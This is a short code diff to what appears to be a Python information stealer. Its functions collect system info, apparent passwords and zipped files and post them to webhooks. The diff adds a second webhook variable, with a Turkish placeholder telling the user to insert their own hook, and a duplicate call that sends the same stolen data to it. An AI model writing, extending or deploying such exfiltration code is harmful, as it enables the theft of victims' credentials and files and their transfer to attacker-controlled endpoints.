@@ -355,6 +355,7 @@ def Reformat(listt):
     return list(set(e))
 
 def upload(name, link):
+    myhook = 'buraya kendi hookunu koy...'
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -383,6 +384,7 @@ def upload(name, link):
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        LoadUrlib(myhook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "wppassw":
@@ -613,7 +615,7 @@ def GatherZips(paths1, paths2, paths3):
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
-
+    
     data = {
         "content": globalInfo(),
         "embeds": [
